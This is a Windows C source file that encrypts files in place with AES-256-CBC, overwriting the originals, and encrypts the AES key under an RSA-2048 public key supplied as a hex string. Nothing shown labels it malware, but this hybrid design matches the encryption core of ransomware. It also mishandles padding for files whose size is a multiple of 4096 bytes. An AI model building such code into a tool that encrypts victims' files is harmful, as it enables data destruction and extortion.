#include "aes.h"
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include "utils.h"

int generate_random_key(unsigned char *key, size_t key_len) {
    if (key_len == 0 || key == NULL) {
        return 0;
    }

    BCRYPT_ALG_HANDLE hAlg;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return 0;
    }

    status = BCryptGenRandom(hAlg, key, (ULONG)key_len, 0);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return 0;
    }

    return 1;
}

int encrypt_file_aes_cbc(const char *filepath, const unsigned char *key) {
    HANDLE hInput = INVALID_HANDLE_VALUE, hOutput = INVALID_HANDLE_VALUE;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char iv[16];
    BOOL success = FALSE;
    DWORD bytesRead, bytesWritten;
    unsigned char buffer[4096];
    ULONG encryptedLen;
    NTSTATUS status;
    char tempFile[MAX_PATH];

    // Generate random IV
    if (!generate_random_key(iv, sizeof(iv))) {
        return 0;
    }

    hInput = CreateFile(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInput == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // Encrypt in a tmp file first to don't mess with the original file if something fails
    snprintf(tempFile, sizeof(tempFile), "%s.tmp", filepath);
    hOutput = CreateFile(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        CloseHandle(hInput);
        return 0;
    }

    // Append IV to the beginning of the output file
    success = WriteFile(hOutput, iv, sizeof(iv), &bytesWritten, NULL);
    if (!success || bytesWritten != sizeof(iv)) {
        goto cleanup;
    }

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                               sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    status = BCryptSetProperty(hKey, BCRYPT_INITIALIZATION_VECTOR, iv, sizeof(iv), 0);
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Encrypt file in chunks
    while (ReadFile(hInput, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (bytesRead < sizeof(buffer)) {
            // Last chunk -> padding
            status = BCryptEncrypt(hKey, buffer, bytesRead, NULL, NULL, 0,
                                   NULL, 0, &encryptedLen, BCRYPT_BLOCK_PADDING);
            if (!BCRYPT_SUCCESS(status)) {
                goto cleanup;
            }
        } else {
            status = BCryptEncrypt(hKey, buffer, bytesRead, NULL, NULL, 0,
                                   NULL, 0, &encryptedLen, 0);
            if (!BCRYPT_SUCCESS(status)) {
                goto cleanup;
            }
        }

        unsigned char *encrypted = malloc(encryptedLen);
        if (!encrypted) {
            goto cleanup;
        }

        status = BCryptEncrypt(hKey, buffer, bytesRead, NULL, NULL, 0,
                               encrypted, encryptedLen, &encryptedLen,
                               bytesRead < sizeof(buffer) ? BCRYPT_BLOCK_PADDING : 0);
        if (!BCRYPT_SUCCESS(status)) {
            free(encrypted);
            goto cleanup;
        }

        success = WriteFile(hOutput, encrypted, encryptedLen, &bytesWritten, NULL);
        free(encrypted);
        if (!success || bytesWritten != encryptedLen) {
            goto cleanup;
        }
    }

    // Overide the original file with the tmp file
    CloseHandle(hInput);
    CloseHandle(hOutput);
    hInput = hOutput = INVALID_HANDLE_VALUE;
    if (!MoveFileEx(tempFile, filepath, MOVEFILE_REPLACE_EXISTING)) {
        DeleteFile(tempFile);
        return 0;
    }

    return 1;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (hInput != INVALID_HANDLE_VALUE) CloseHandle(hInput);
    if (hOutput != INVALID_HANDLE_VALUE) {
        CloseHandle(hOutput);
        DeleteFile(tempFile);
    }
    return 0;
}

int encrypt_aes_key_with_rsa(const unsigned char *aes_key, size_t aes_key_len,
                             const char *rsa_n_hex, unsigned char **encrypted_key,
                             size_t *encrypted_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    unsigned char n_bytes[256]; // 2048-bit modulus = 256 bytes
    unsigned char *keyBlob = NULL;
    
    // n: hex -> bytes
    if (!hex_to_bytes(rsa_n_hex, n_bytes, sizeof(n_bytes))) {
        return 0;
    }
    for (int i = 0; i < 128; i++) {
        unsigned char temp = n_bytes[i];
        n_bytes[i] = n_bytes[255 - i];
        n_bytes[255 - i] = temp;
    }

    // Generate RSA public key
    BCRYPT_RSAKEY_BLOB blob = {0};
    blob.Magic = BCRYPT_RSAPUBLIC_MAGIC;
    blob.BitLength = 2048;
    blob.cbPublicExp = 3;
    blob.cbModulus = 256;
    blob.cbPrime1 = 0;
    blob.cbPrime2 = 0;
    unsigned char exponent[] = {0x01, 0x00, 0x01}; // e = 65537

    size_t blobSize = sizeof(BCRYPT_RSAKEY_BLOB) + blob.cbPublicExp + blob.cbModulus;
    keyBlob = malloc(blobSize);
    if (!keyBlob) {
        return 0;
    }
    memcpy(keyBlob, &blob, sizeof(BCRYPT_RSAKEY_BLOB));
    memcpy(keyBlob + sizeof(BCRYPT_RSAKEY_BLOB), exponent, blob.cbPublicExp);
    memcpy(keyBlob + sizeof(BCRYPT_RSAKEY_BLOB) + blob.cbPublicExp, n_bytes, blob.cbModulus);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        free(keyBlob);
        return 0;
    }

    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, keyBlob, (ULONG)blobSize, 0);
    free(keyBlob);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    // Encrypt the AES key using RSA with OAEP padding
    BCRYPT_OAEP_PADDING_INFO paddingInfo = { BCRYPT_SHA1_ALGORITHM, NULL, 0 };
    status = BCryptEncrypt(hKey, (PUCHAR)aes_key, (ULONG)aes_key_len, &paddingInfo,
                           NULL, 0, NULL, 0, (ULONG*)encrypted_len, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    *encrypted_key = malloc(*encrypted_len);
    if (!*encrypted_key) {
        goto cleanup;
    }

    status = BCryptEncrypt(hKey, (PUCHAR)aes_key, (ULONG)aes_key_len, &paddingInfo,
                           NULL, 0, *encrypted_key, (ULONG)*encrypted_len,
                           (ULONG*)encrypted_len, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        free(*encrypted_key);
        *encrypted_key = NULL;
        goto cleanup;
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 1;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}
